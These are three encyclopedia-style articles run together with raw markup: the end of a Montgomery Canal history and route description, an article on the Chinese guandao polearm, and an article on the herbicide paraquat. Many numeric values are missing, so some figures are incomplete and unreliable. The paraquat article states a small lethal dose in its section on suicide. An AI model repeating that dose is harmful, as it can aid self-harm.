Gallowstree Bridge was opened by David Suchet on 7 June 1992. The canal from Frankton Locks to the River Perry crosses Perry Moor and historically, the bed had no puddling at this point relying instead on the water table of the peat moor to retain the water. Modern agricultural methods had changed this and a new lining using butyl, concrete and gabions had to be created during 1994. Shrinkage of the peat had also caused subsidence of the canal and a new lock was built with a drop of . On 3 June 1995, the restored section between Frankton Locks and the aqueduct over the River Perry was opened and the new lock was named the Graham Palmer lock, after the man who had been instrumental in so much canal restoration through the creation of the Waterway Recovery Group. The section onwards to Queen&#x27;s Head, a hamlet on the A5 trunk road, followed on 21 September 1996 extending the length of navigable canal connected to the national network to . The section from Maesbury to Redwith benefitted from European Regional Development funding awarded in 2000 but there were fears that restoration might be hampered by the designation of large lengths of the canal in Powys as a Site of Special Scientific Interest (SSSI) by the Countryside Council for Wales. Negotiations took place between the Trust, the Council and English Nature to ensure that this did not happen and an agreement was eventually worked out in 2005 which would ensure that the flora and fauna would be protected by off-line nature reserves, to allow full navigation on the main line of the canal.

In the autumn of 2002 work was started on the restoration of Newhouse Lock, the penultimate lock on the southern section still owned by British Waterways. Soon after work started, it became evident that there were structural problems which had not been apparent when the first engineering inspection had been carried out. Further funding was obtained and the quality of the work done by volunteers resulted in them completing some of the tasks originally assigned to professionals. £250,000 was spent on the project, significantly less than the revised budget, and the contribution of volunteer labour was valued at £45,000. The restoration was completed six months ahead of schedule in 2006 and the lock was opened officially on 25 June 2006 by Lembit Opik MP in conjunction with the Annual Montgomery Dinghy Dawdle. The restoration of the lock was named Welsh Project of the Year by the Royal Institution of Chartered Surveyors in May 2007. This completed the restoration of all of the locks on the section of the canal owned by British Waterways and was the eleventh lock on the Welsh section of the canal to be restored by the Shropshire Union Canal Society.

In 2003, the section from Queen&#x27;s Head to Gronwen Wharf was reopened opening the canal through the village of Maesbury Marsh. The section from Gronwen Wharf to Redwith Bridge was filled with water in October 2007. Rare flora and fauna were accommodated by the construction of an off-line nature reserve on land leased by British Waterways for 50 years. The cost of the reserve added an extra £250,000 to the projected cost and this was partially funded by the Heritage Lottery Fund and EU Interreg funds. Restoration then started on the section onwards to Pryces Bridge. Rebuilding of the channel involved the laying of over 40,000 concrete bricks and the use of a Bentonite membrane. The refurbished channel was opened on 19 July 2014 by Owen Paterson, the MP for North Shropshire, but because there is no winding hole at the end of it, the limit of navigation remained at Gronwen Wharf for most boats.

In 2007, restoration of Crickheath Basin was started by the Shropshire Union Canal Society though in 2008, work was postponed due to land ownership issues. Between 2014 and 2022, the section of canal between Pryces Bridge and Crickheath Bridge was restored. This was aided by the award of a National Lottery grant in 2016. The section was officially opened on 2 June 2023. As there is a winding hole at Crickheath Basin, just north of Crickheath Bridge, re-opening allows navigation of the canal between Redwith Bridge and Crickheath Bridge.

=== Current restoration projects ===
Restoration of the section of canal between Crickheath Bridge and Schoolhouse Bridge started in 2023. A separate project to rebuild the dropped Schoolhouse Bridge was also completed in 2024. The two projects will not in themselves allow the section of canal between Crickheath Bridge to Schoolhouse Bridge to be re-opened to navigation as there is no winding hole on this section.

A joint bid by Powys County Council and the Canal and RIver Trust for funding to further restore the canal between Llanymynech and Arddleen succeeded when in October 2021, the Chancellor of the Exchequer, Rishi Sunak, announced the award of £16 million for the purpose as part of his annual budget. The award comes from the government&#x27;s &#x27;Levelling Up Fund&#x27;, and covers restoration of in Wales. The money has to be spent by the spring of 2024 but will not include the restoration of two dropped bridges near Ardleen.

Restoration is being carried out by a partnership of the Montgomery Waterway Restoration Trust and the national Canal &amp; River Trust (who own the canal and are its navigation authority). As of 2023, Crickheath Basin remains the limit of navigation for larger powered craft on the northern section of the canal which is connected to the Llangollen Canal and the wider Canal &amp; River Trust network at Frankton Junction. A very short section of navigable canal exists in Llanymynech and a separate longer navigable section operates in the Welshpool area; however these two sections are not connected to any other navigable canal and are therefore &#x27;isolated&#x27;.

==Architecture==
The lock gear on the Eastern Branch of the Montgomeryshire were of a different design to those on other canals. Whereas most other canal locks have culverts in the side walls to fill and empty the lock, with paddles opening and closing vertically, the locks on the Montgomeryshire were designed with a culvert in the base of the canal with the paddle sliding horizontally over the culvert. During operation, this can lead to a large whirlpool being observed. To operate the paddle, the winding gear is purely a geared design rather than rack and pinion. An effect of this is that there is no pawl to be operated and the paddles cannot be accidentally dropped shut. The paddle gear was designed by George W. Buck, who was appointed Engineer of the Eastern branch in 1819, and Clerk to the Western branch in 1822.

Many of the lock gates on the Montgomeryshire Canal were replaced with cast iron gates. These gates were curved with tubular cast iron balance beams. The last surviving pair were removed from Welshpool and taken to Stoke Bruerne Canal Museum in the early 1970s.

Bridge numbers on the Montgomery sections of the canal continue on from the Llanymynech Branch of the Ellesmere Canal at Frankton Junction. The first bridge on the Montgomery Canal (Lockgate Bridge) is therefore number 70, the numbering beginning at Hurleston Junction. Because of this, the Llangollen Canal has two separate series of bridge numbering, one ending at Frankton Junction and the other beginning at Frankton Junction.

==Nature conservation==
In the years following the closure of the canal, wildlife flourished. The whole of the Welsh section and parts of the English section (notably the section from the Aston Locks to Keeper&#x27;s Bridge) were designated as Sites of Special Scientific Interest (SSSI). The notable wildlife includes Floating Water Plantain and Grass-wrack pondweed.

To preserve the wildlife, nature reserves have been created at points along the canal. These include Rednal Basin, most of the Weston Branch and a specially constructed reserve alongside the Aston Locks. Some winding holes have been given over to nature with the one adjacent to Crofts Mill Lift Bridge having had boat barriers installed and the one adjacent to Park Mill Bridge having been allowed to become overgrown. A maximum of 1,250 boats per year are allowed passage on the navigable section in England (i.e. that part connected to the Llangollen Canal). In addition, there are stricter speed restrictions than normally found on British canals, for example, 2 and 3 mph on the navigable and connected part.

==Towpath==
The towpath of almost all the canal is used as a footpath. The section between Pool Quay Lock and Newtown forms part of the Severn Way. Shorter sections south of Llanymynech and Pool Quay are followed by the Offa&#x27;s Dyke Path.

==Route==
===Frankton Junction to Carreghofa===

This section was originally the Llanymynech branch of the Ellesmere Canal but since the passing of the British Waterways Act 1987, it is officially the first section of the Montgomery Canal. The previous history is reflected in the numbering of the bridges which start from 70 following on from a sequence which begins at Hurleston Junction where the Llangollen Canal meets the main line of the Shropshire Union Canal. The section of the canal from Frankton Junction to Gronwen Wharf (just north of Bridge 82) is navigable by narrowboat.

Access through the locks at Frankton Junction is strictly controlled and must be booked in advance. The locks are operated by a Canal and River Trust lock-keeper and passage was only allowed between 09:00 am and 12:00 noon in 2020. The number of boats using the locks is restricted to a maximum of twelve in either direction on any one day and having passed down the locks onto the canal, boaters must stay for a minimum of one day and a maximum of 14. Repeat visits cannot be made within six weeks of leaving the canal. The locks consist of a two-chamber staircase lock and two single locks. Alongside the locks are several canal buildings including a boatbuilder&#x27;s house. The remains of a dry dock can be seen in the garden and it was here that the grain boat &quot;Cressy&quot; was converted for leisure use in 1929 by Jack Beech. The boat was bought by L.T.C. Rolt in 1939, who used it to tour the decaying canal network and was instrumental in the setting up of the Inland Waterways Association. A plaque commemorating this was attached to the lock entrance and unveiled by his widow, Sonia Rolt, on 17 January 2009.

The now-infilled Weston Branch, which terminated at a wharf at Weston Lullingfields branches off between Frankton Locks and Lockgate Bridge. Only a short section remains, part of which is used for mooring and part as a nature reserve. There is a Canal &amp; River Trust amenity block alongside. Just beyond the junction is Lockgate Bridge (70), a red-brick humped-back road bridge dating from 1785 which remains almost in its original state. It is a grade II listed structure.

The canal passes through a peat bog which has been drained since the construction of the canal. This lowering of the water level has meant that during restoration the canal had to be lined to prevent leakage and a new lock was required to lower the water level. This lock was named Graham Palmer Lock after the founder of the Waterway Recovery Group. The Perry Aqueduct crosses the River Perry and was replaced during restoration. The old aqueduct had three small arches and restricted the flow on the river in flood conditions. As it was in a poor state of repair, it was replaced by a single span steel structure. Beyond the aqueduct, the canal is very straight as a diversion was built in 1822. (The original route of the canal had followed a less direct path at the insistence of one of the Proprietors, who wanted the canal to serve his Woodhouse Estate.)

Rednal Basin was originally used for transshipment between the canal and the Chester and Shrewsbury Railway. This finished in the 1850s and it subsequently served a bone mill. Although the link to the basin still exists and there is a swing bridge over the entrance, it is not used for boats as it is a nature reserve. At Queen&#x27;s Head the canal passes under both the old and the new A5 road. There are mooring spaces and some Canal &amp; River Trust buildings at Queen&#x27;s Head. Following Queen&#x27;s Head are the three Aston Locks. The top lock has a nature reserve alongside, built during restoration.

The canal passes through Maesbury Marsh, a village built largely alongside the canal. Canal Central, an environmentally-friendly building incorporating a post office, shop, tearoom, accommodation and bike and canoe hire was built alongside the canal near the village (just to the west of Spiggots Bridge) in 2006. Mooring is available along sections of the canal at Maesbury Marsh. Bridge 81 is a lift bridge, which requires a windlass to operate, and immediately to its west, the Mill Arm (or Peate&#x27;s Branch) has been restored for much of its length giving access to a boatyard and private moorings.

The section of the canal from Gronwen Wharf to Redwith Bridge (No. 83) was re-opened in October 2007. In 2014, restoration of the section from Redwith Bridge to Pryces Bridge (No. 84) was completed. Redwith Bridge had been lowered after the canal&#x27;s closure but has been rebuilt and is now capable of taking narrowboats underneath once again. In 2023, the canal was re-opened from Pryces Bridge to Crickheath Wharf, just north of Bridge 85.

The section of the canal from Crickheath Wharf through Pant to Llanymynech is dry but restoration continues to take place to close the gap with the next navigable section. In this section, the demolished Schoolhouse Bridge was replaced but no other bridges need to be replaced and there are no locks. Through Pant, the canal ran alongside the Oswestry and Newtown Railway which later became part of the Cambrian Railways network. The Cambrian Railways Trust has restored a short section of the line between Llynclys and Pant and has built a halt at Penygarreg Lane near to the canal.

Since 2006, a short section either side of Llanymynech has been navigable and boats can turn around at a winding hole at each end. The wharf at Llanymynech has also been restored. Canal trips are provided on this Llanymynech stretch by the narrowboat &quot;George Watson Buck&quot;. As the canal passes underneath Llanymynech Bridge it passes from Shropshire, England into Powys, Wales.

The section of the canal from just after Pant through Llanymynech to Carreghofa is in water although Carreghofa Lane now crosses the canal just to the north of Walls Bridge (No. 93) and this new crossing (built after the canal&#x27;s closure) obstructs the canal.

Wern Aqueduct was built after the canal was originally opened to allow a newly constructed branch of the Shropshire and Montgomeryshire Railway to pass below. A temporary diversion of the canal was put in place to allow construction of the aqueduct and the entrances to the diversion remain visible.

A feeder from the River Tanat enters the canal above Carreghofa Locks. Built in 1822 by the Montgomeryshire Canal Company, it originally fed water between the locks so that none could enter the Ellesmere Canal. When the canals were united, the feeder was diverted to enter the canal above the locks so that the lowest pound of the former Ellesmere Canal also gained from the feeder.

The end of the Llanymynech Branch of the Ellesmere Canal joins end-on to the Eastern Branch of the Montgomeryshire Canal at Carreghofa Locks.

===Eastern Branch===

The section of the canal from Carreghofa to Arddleen is in water although several bridges have been lowered.

Between the two Carreghofa Locks was a side pond. This was necessary as the pound between the locks is short.

Near the Vyrnwy Aqueduct, arches were built in the embankment of the canal to provide protection from flooding of the River Vyrnwy. The aqueduct itself has been repaired and strengthened in the 1820s, 1890s and 1970s. It sometimes can be seen to leak into the River Vyrnwy though the leaks self-heal. Unlike the nearby Chirk Aqueduct and Pontcysyllte Aqueduct, which have cast iron troughs, the Vyrnwy Aqueduct is built of stone and is puddled. The weight of this structure led to it being strengthened with tie bars and girders in the 1820s.

Bridges 102 and 103 carry a major road and have been lowered since the canal was closed. To restore navigation, lowering of the pound by addition of an extra lock has been proposed.

The section of the canal from Arddleen to Refail (Efail-Fach) Bridge is navigable.

The Guilsfield Arm never actually reached Guilsfield. The arm was long with a wharf at its terminus. It was level, with no locks or tunnels, and this was achieved by a cutting 600 feet long and up to 20 feet deep. Today the arm is cut off from the main line by a lowered bridge. A short section has been made into a nature reserve and beyond that, the arm is dry.

The pound below Burgedin Bottom Lock is the sump pound of the canal, the Eastern Branch of the Montgomeryshire being filled by lockings from the Ellesmere, the Tanat feeder at Carreghofa and a feeder from the River Rhiw at Berriew.

The canal through Welshpool was one of the first sections to be restored in 1969 when it was proposed that the route of the canal be used for a bypass. Welshpool Town Lock had gates made of cast iron when the canal was closed. These were removed, taken to Stoke Bruerne Canal Museum and replaced by gates of a standard design.

===Western Branch===

The section of the canal from Refail (Efail-Fach) Bridge to Freestone Lock is in water and heads in a generally south-westerly direction. Several bridges have been lowered including bridges under the A483 which runs in the same direction as the canal traversing it in places. At Brynderwyn, there is a lock with a whitewashed cottage, once the home of the lockkeeper. To the north of the lock was Brynderwyn Wharf, once a coal wharf, and the towpath briefly changes from the eastern side to the west between bridges 145 and 146 to accommodate it. Several of the bridges on this section of canal are made from cast iron from nearby Brymbo. Glanhafren Bridge, no. 143, carries the date 1889 and has ornate balustrades made from cast iron while bridge 147, which carries Brynderwen New Road over the canal to the north of Abermule, dates from 1853.

To the south of Abermule, the A483 cuts across the bed of the canal at an angle. This section of road is relatively recent as the road crossed over the canal at bridge 147 and ran to the east of Abermule when the 1975 Ordnance Survey map was published, but the Abermule western bypass had been built by 1983. To the south-west, Byles Lock and Newhouse Lock continue the ascent towards Newtown. At Aberbechan, a three-arched aqueduct carries the canal over Bechan Brook, a tributary of the River Severn. Nearby are the remains of a corn mill and some maltings. The final bridge on the watered section, no. 153, includes the cast lettering &quot;Brymbo 1862&quot;. Immediately afterwards is Freestone Lock, beyond which the canal is dry.

Below bridge 153, water enters the canal from the Penarth Weir on the River Severn. The weir is to the south of the lock and is an unusual double-tiered structure. It was constructed by Josiah Jessop in 1813-1814 and there is a modern salmon leap on its western side. The weir can be reached from the lock by following a footpath. Between the river and the canal are the former settling beds of Dolfor Sewage Treatment Works, now maintained as a wildlife haven by the Montgomeryshire Wildlife Trust. The section of the canal from Freestone Lock to Newtown is largely filled-in and the site of the basin in Newtown, together with the last of the route, has become a housing estate. A public footpath follows the route of the canal for most of the distance passing the sites of Dolfor Lock and Rock Lock on its way.

The Newtown Pumphouse raised water from the River Severn to the canal, initially using an undershot water wheel to operate two bucket pumps. This was supplemented by a steam engine for times when the waterwheel failed to provide sufficient power. In time, this arrangement was replaced by a diesel-powered pump but pumping was discontinued in the 1940s. The building, which originally had a tall chimney, still exists but is in private ownership.

<doc id="1065733" wikidata="Q1191706" url="?curid=1065733" title="Guandao">
<text>A guandao is a type of Chinese polearm that is used in some forms of Chinese martial arts. In Chinese, it is properly called a yanyuedao (偃月刀; lit. &quot;reclining moon blade&quot;), the name under which it always appears in texts from the Song to Qing dynasties such as the &quot;Wujing Zongyao&quot; and &quot;Huangchao Liqi Tushi&quot;. It is comparable to the Japanese naginata and the European fauchard or glaive and consists of a heavy blade with a spike at the back and sometimes also a notch at the spike&#x27;s upper base that can catch an opponent&#x27;s weapon. In addition, there are often irregular serrations that lead the back edge of the blade to the spike. The blade is mounted atop a long wooden or metal pole and a pointed metal counterweight on the opposite end, which is used to balance the heavy blade and for striking.

On modern versions, a red sash or tassel is attached at the joint of the pole and blade. Variations include rings along the length of the straight back edge as found in the nine-ring guandao, the tip curling into a rounded spiral as in the elephant guandao, or a more ornate design as exemplified by the dragon head guandao. However, apart from the &quot;elephant guandao&quot;, none of these variations seem to have historical grounding.

==History==
According to legend, the guandao was invented by the famous general Guan Yu during the early 3rd century AD, hence the name. It is said that he specified its form and size to be made by a smithy and was uniquely able to wield such an imposing weapon due to his large stature and legendary strength. Guan Yu&#x27;s guandao was called &quot;Green Dragon Crescent Blade&quot; (青龍偃月刀, Qīnglóng yǎnyuèdāo) and weighed 82 Chinese jin. This weight is estimated either at or , as a Han dynasty jin was , while the jin used in the Ming dynasty—during which the Romance of the Three Kingdoms was written—was .

However, while the famous novel &quot;Romance of the Three Kingdoms&quot; by Luo Guanzhong describes him as wielding the guandao, this description may have been an anachronistic one intended to make the character seem more imposing: historically speaking there was no evidence to show that Guan Yu used the weapon that is thus attributed to him, and indeed there is no indication of the existence of what is now known as the guandao prior to the 11th century, when it was first illustrated in the military manual &quot;Wujing Zongyao&quot;. The guandao, therefore, possibly did not even exist during Guan Yu&#x27;s era, meaning that it could be somewhat of a pop culture-derived misnomer. Furthermore, the scholar Tao Hongjing (456–536 AD) recorded in the &quot;Gujin Daojianlu&quot; (古今刀劍錄, &quot;A Catalogue of Ancient and Modern Sabers and Rapiers&quot;) that Guan Yu forged a pair of sabres using iron ore he harvested from Wudushan mountain (武都山) himself, which may have inspired the story that Guan Yu invented his weapon. However, this would also indicate that he did not use a guandao or even anything resembling a guandao, since the pole-mounted or long-handled dao weapons such as the pudao or dadao were all wielded with two hands and so would not have been made or used in a pair.

While some historians still contend that the guandao was simply an uncommon weapon prior to the Tang dynasty and was thus not illustrated before then, historical evidence leans towards the attribution being an instance of creative license. By the time of the Qing dynasty the guandao, for the most part, was not actually intended for field use but was instead used as a tool to test the strength of those who wished to become military officers: weapons of various weights were made, and the test comprised simply performing various required maneuvers using such weapons. During the Qing dynasty some extraordinarily heavy versions of guandao were made for this purpose: a candidate had to be able to wield a weapon weighing 80, 100, or 120 jin (, , or , using the modern value for 1 jin = approximately ), with weapons of each weight being successively higher grades in the exam, the passage of which led to appointment as military officers of various ranks based on the grade. The heaviest known &quot;testing guandao&quot;, which resides in a museum at Shanhaiguan, weighs . While the examples are taken from the Qing dynasty and therefore may have been influenced by the book (which was written in the Ming dynasty), military officer tests (which began in the Tang dynasty) have always involved lifting heavy stones of standardized weight and maneuvering them about, possibly contributing to the writer&#x27;s decision to assign an unusual weight to Guan Yu&#x27;s weapon.

The weapon was also widely adopted by martial artists for the purposes of training and for demonstrating their strength, perhaps also to train specifically for the military officers&#x27; tests. Where it was used, it was largely used by infantry. In the Qing dynasty, it was used by the all Han Green Standard Army. Apart from that, the lack of standardization of the antique examples that survive to today seems to indicate that at least from the 19th century onwards it was popular in the civilian martial arts realm as well.

The modern guandao as adopted by martial artists today usually weighs between , and is typically composed of a wood shaft of about in length, a short blade of about on one end, and a mace head on the other (which serves mostly as a counterweight to the blade but can also be used for striking), the whole assembly rarely exceeding in total length. The greatly reduced weight and length reflect its nature as a more practical form for martial artists.

==Combat uses==

The guandao is used quite frequently in the martial art of contemporary Wushu derived from the Shaolin or Wudangquan form of martial arts in modern times. According to contemporary Wushu practice, its purpose is more to disarm an opponent and deflect his strikes rather than to attack. To that end, a large veil cloth is attached to the end to dissuade and confuse opponents. However, there is no evidence of this being an authentic depiction of the weapon&#x27;s historical usage. Tassels and cloths are attached to numerous weapons such as jian, dao, meteor hammer, and guandao used in Chinese opera, one of the sources of movements found in contemporary Wushu.

Forms utilizing the weapon in nearly all traditional styles of Chinese martial arts emphasize strong slashing movements and momentum to keep the heavy blade moving through a series of spinning cuts. The considerable weight of the weapon also makes guandao forms good for training the overall conditioning of the body.

Similar weapons were also used in Southeast Asia. They were famously used by royals to fight each other on elephant back.

<text>Paraquat (trivial name; ), or &quot;N&quot;,&quot;N&quot;′-dimethyl-4,4′-bipyridinium dichloride (systematic name), also known as methyl viologen, is a toxic organic compound with the chemical formula [(C6H7N)2]Cl2. It is classified as a viologen, a family of redox-active heterocycles of similar structure. This salt is one of the most widely used herbicides worldwide. It is quick-acting and non-selective, killing green plant tissue on contact.

Paraquat is toxic (lethal) to human beings and animals. Paraquat&#x27;s poisoning and lethality depends on the dose and how the herbicide is absorbed by the body. In humans, paraquat damages the mouth, stomach, and intestines if it is ingested. Once absorbed, paraquat causes particular damage to the lungs, kidneys, and liver. Paraquat&#x27;s lethality is attributed to its enhancing production of superoxide anions and human lung cells accumulate paraquat. Paraquat exposure has been linked to the development of Parkinson&#x27;s disease. 

Paraquat may be in the form of salt with chloride or other anions; quantities of the substance are sometimes expressed by cation mass alone (paraquat cation, paraquat ion). The name is derived from the &quot;para&quot; positions of the &quot;quaternary&quot; nitrogens.

==Production and redox reactions==

Pyridine is coupled by treatment with sodium in ammonia followed by oxidation to give 4,4′-bipyridine. This chemical is then dimethylated with chloromethane (its discoverers Austrian chemist Hugo Weidel and his student M. Russo used iodomethane) to give the final product as the dichloride salt.

Use of other methylating agents gives the bispyridinium with alternate counterions. For example, Hugo Weidel&#x27;s original synthesis used methyl iodide to produce the diiodide.

==Herbicide use==
Although first synthesized by Weidel and Russo in 1882, paraquat&#x27;s herbicidal properties were not recognized until 1955 in the Imperial Chemical Industries (ICI) laboratories at Jealott&#x27;s Hill, Berkshire, England. Paraquat was first manufactured and sold by ICI in early 1962 under the trade name Gramoxone, and is today among the most commonly used herbicides.

Paraquat is classified as a non-selective contact herbicide. The key characteristics that distinguish it from other agents used in plant protection products are:

*It kills a wide range of annual grasses and broad-leaved weeds and the tips of established perennial weeds.
*It is very fast-acting.
*It is within minutes of application.
*It is partially inactivated upon contact with soil.

These properties led to paraquat being used in the development of no-till farming.

The European Union approved the use of paraquat in 2004 but Sweden, supported by Denmark, Austria, and Finland, appealed this decision. In 2007, the court annulled the directive authorizing paraquat as an active plant protection substance stating that the 2004 decision was wrong in finding that there were no indications of neurotoxicity associated with paraquat and that the studies about the link between paraquat and Parkinson&#x27;s disease should have been considered. Thus, paraquat has been banned in the European Union since 2007.

China also banned the domestic use of Paraquat in 2017; so followed India, Thailand in 2019 and Brazil, Chile, Malaysia, Peru and Taiwan between 2020 and 2022.

In the United States, paraquat is available primarily as a solution in various strengths. It is classified as a restricted use pesticide, which means that it can be used by licensed applicators only. According to an October 2021 estimate, the use of paraquat in US agriculture as mapped by the US Geological Survey showed a doubling from 2013 to 2018, reaching annually, up from in 1974.

There is an ongoing international campaign for a global ban, but the cheap and popular paraquat continues to be unrestricted in most developing countries. The Chemical Review Committee (CRC) of the Rotterdam Convention recommended to the Conference of the Parties (COP) paraquat dichloride formulations for inclusion in Annex III to the Convention in 2011. A small group of countries, including India and Guatemala and supported by manufacturers, have since blocked the listing of paraquat as a hazardous chemical for the purposes of the Rotterdam Convention.

In Australia, paraquat is used as a herbicide to control annual grasses, broadleaf weeds and ryegrass in crops of Chickpeas, Faba beans, field peas, lupins, lentils and vetch. Aerial spraying is forbidden, as is harvesting within 2 weeks of application in some crops.

==Reactivity and mode of action==

Paraquat is an oxidant that interferes with electron transfer, a process that is common to all life. Addition of one electron gives the radical cation:
: [paraquat]2+ + e− [paraquat]•+
The radical cation is also susceptible to further reduction to the neutral [paraquat]0:
: [paraquat]•+ + e− [paraquat]0

As an herbicide, paraquat acts by inhibiting photosynthesis. In light-exposed plants, it accepts electrons from photosystem I (more specifically ferredoxin, which is presented with electrons from PS I) and transfers them to molecular oxygen. In this manner, destructive reactive oxygen species (ROS) are produced. In forming these reactive oxygen species, the oxidized form of paraquat is regenerated, and is again available to shunt electrons from photosystem I to restart the cycle. This induces necrosis, and unlike with some mechanisms of necrosis, does not produce double-stranded breaks. Target weeds die within 4 days; symptoms can show after as little as a few hours.

Paraquat is often used in science to catalyze the formation of ROS, more specifically, the superoxide free radical. Paraquat will undergo redox cycling &quot;in vivo&quot;, being reduced by an electron donor such as NADPH, before being oxidized by an electron receptor such as dioxygen to produce superoxide, a major ROS.

==Weed resistance management==
Problems with herbicide resistant weeds may be addressed by applying herbicides with different modes of action, along with cultural methods such as crop rotation, in integrated weed management (IWM) systems. Paraquat, with its distinctive mode of action, is one of few chemical options that can be used to prevent and mitigate problems with weeds that have become resistant to the very widely used non-selective herbicide glyphosate. Paraquat is a Group L (Aus), D (global), 22 (numeric) resistance class herbicide, which it shares with diquat and cyperquat.

One example is the &quot;double knock&quot; system used in Australia. Before planting a crop, weeds are sprayed with glyphosate first, then followed seven to ten days later by a paraquat herbicide. Although twice as expensive as using a single glyphosate spray, the &quot;Double Knock&quot; system is widely relied upon by farmers as a resistance management strategy. Nevertheless, herbicide resistance has been seen for both herbicides in a vineyard in Western Australia – though this singular report gives no indication of what regimen was being followed, particularly if the two herbicides were being used in a &quot;double knock&quot; tandem.

A computer simulation reported in the scientific journal &quot;Weed Research&quot; showed that with alternating annual use between glyphosate and paraquat, only one field in five would be expected to have glyphosate-resistant annual ryegrass (&quot;Lolium rigidum&quot;) after 30 years, compared to nearly 90% of fields sprayed only with glyphosate. A &quot;Double Knock&quot; regime with paraquat cleaning-up after glyphosate was predicted to keep all fields free of glyphosate resistant ryegrass for at least 30 years.

==Toxicity==
Paraquat is toxic to humans (Category II) by the oral route and moderately toxic (Category III) through the skin. Pure paraquat, when ingested, is highly toxic to mammals, including humans, causing severe inflammation and potentially leading to severe lung damage (e.g., irreversible pulmonary fibrosis, also known as &#x27;paraquat lung&#x27;), acute respiratory distress syndrome (ARDS), and death. The mortality rate is estimated between 60% and 90%.

Paraquat is also toxic when inhaled and is in the Toxicity Category I (the highest of four levels) for acute inhalation effects. For agricultural uses, the United States Environmental Protection Agency (EPA) determined that particles used in agricultural practices (400–800 μm) are not in the respirable range. Paraquat also causes moderate to severe irritation of the eye and skin. Diluted paraquat used for spraying is less toxic; thus, the greatest risk of accidental poisoning is during mixing and loading paraquat for use.

The standard treatment for paraquat poisoning is first to remove as much as possible by pumping the stomach. Fuller&#x27;s earth or activated charcoal may also improve outcomes depending on the timing. Haemodialysis, haemofiltration, haemoperfusion, or antioxidant therapy may also be suggested. Immunosuppressive therapy to reduce the inflammation is an approach suggested by some, however only low certainty evidence supports using medications such as glucocorticoids with cyclophosphamide in addition to the standard care to reduce mortality. It is also unknown if adding glucocorticoid with cyclophosphamide to the standard care has unwanted side effects such as increasing the risk of infection. Oxygen should not be administered unless SpO2 levels are below 92%, as high concentrations of oxygen intensify the toxic effects.
Death may occur up to 30 days after ingestion.

Lung injury is a main feature of poisoning. Liver, heart, lung, and kidney failure can occur within several days to weeks that can lead to death up to 30 days after ingestion. Those who suffer large exposures are unlikely to survive. Chronic exposure can lead to lung damage, kidney failure, heart failure, and oesophageal strictures. The mechanism underlying paraquat&#x27;s toxic damage to humans is still unknown. The severe inflammation is thought to be caused by the generation of highly reactive oxygen species and nitrite species that results in oxidative stress. The oxidative stress may result in mitochondrial toxicity and the induction of apoptosis and lipid peroxidation which may be responsible for the organ damage. It is known that the alveolar epithelial cells of the lung selectively concentrate paraquat. It has been reported that a small dose, even if removed from the stomach or spat out, can still cause death from fibrous tissue developing in the lungs, leading to asphyxiation.

Accidental deaths and suicides from paraquat ingestion are relatively common. For example, there are more than 5,000 deaths in China from paraquat poisoning every year in part leading to China&#x27;s ban in 2017. Long-term exposures to paraquat would most likely cause lung and eye damage, but reproductive/fertility damage was not found by the EPA in their review.

===&quot;Paraquat pot&quot;===
During the late 1970s, a controversial program sponsored by the US government sprayed paraquat on cannabis fields in Mexico. Following Mexican efforts to eradicate marijuana and poppy fields in 1975, the United States government helped by sending helicopters and other technological assistance. Helicopters were used to spray the herbicides paraquat and 2,4-D on the fields; marijuana contaminated with these substances began to show up in US markets, leading to debate about the program.

Whether any injury came about due to the inhalation of paraquat-contaminated marijuana is uncertain. A 1995 study found that &quot;no lung or other injury in cannabis users has ever been attributed to paraquat contamination&quot;. Also a United States Environmental Protection Agency manual states: &quot;... toxic effects caused by this mechanism have been either very rare or nonexistent. Most paraquat that contaminates cannabis is pyrolyzed during smoking to dipyridyl, which is a product of combustion of the leaf material itself (including cannabis) and presents little toxic hazard.&quot;

In a study by Imperial Chemical Industries, rats that inhaled paraquat showed development of squamous metaplasia in their respiratory tracts after a couple of weeks. This study was included in a report given to the State Department by the Mitre Corporation. The U.S. Public Health Service stated that &quot;this study should not be used to calculate the safe inhalation dose of paraquat in humans.&quot;

===Use in suicide and murder===
A large majority (93 percent) of fatalities from paraquat poisoning are suicides, which occur mostly in developing countries. For instance, in Samoa from 1979 to 2001, 70 percent of suicides were by paraquat poisoning. Trinidad and Tobago is particularly well known for its incidence of suicides involving the use of Gramoxone (commercial name of paraquat). In southern Trinidad, particularly in Penal, Debe from 1996 to 1997, 76 percent of suicides were by paraquat, 96 percent of which involved the over-consumption of alcohol such as rum. Fashion celebrity Isabella Blow died by suicide using paraquat in 2007. Paraquat is widely used as a suicide agent in developing countries because it is widely available at low cost. Further, the toxic dose is low (10 mL or 2 teaspoons is enough to kill). Campaigns exist to control or even ban paraquat, and there are moves to restrict its availability by requiring user education and the locking up of paraquat stores. When a 2011 South Korean law completely banned paraquat in the country, death by pesticide plummeted 46%, contributing to the decrease of the overall suicide rate.

The indiscriminate paraquat murders, which occurred in Japan in 1985, were carried out using paraquat as a poison.
Paraquat was used in the UK in 1981 by a woman who poisoned her husband. American serial killer Steven David Catlin killed two of his wives and his adoptive mother with paraquat between 1976 and 1984. In 2022, a 22-year-old woman, Greeshma Raj, was found guilty of using paraquat for murdering her boyfriend, Sharon Raj, in Kerala, India.

===Parkinson&#x27;s disease===
According to the WHO (2022), some of the measures to prevent Parkinson&#x27;s disease include &quot;banning of pesticides (e.g., paraquat and chlorpyrifos) and chemicals (e.g., trichloroethylene) which have been linked to PD and develop safer alternatives as per WHO guidance&quot; and &quot;accelerate action to reduce levels of and exposure to air pollution, an important risk factor for PD&quot;. A 2011 study showed a link between paraquat use and Parkinson&#x27;s disease in farm workers. A co-author of the paper said that paraquat increases production of certain oxygen derivatives that may harm cellular structures, and that people who used paraquat, or other pesticides with a similar mechanism of action, were more likely to develop Parkinson&#x27;s. A 2013 meta-analysis published in &quot;Neurology&quot; found that &quot;exposure to paraquat ... was associated with about a 2-fold increase in risk&quot; of Parkinson&#x27;s disease. A review in 2021 concluded that the available evidence does not support a causal conclusion. In 2022 and 2023, two reviews from India &quot;decisively demonstrated that paraquat is a substantial stimulant of oxidative stress … and is associated with Parkinson&#x27;s disease (PD)&quot;; and stated that &quot;From the studies we can consider that PQ and MB with its combined effects has tremendous contribution towards neurodegeneration in PD.&quot;

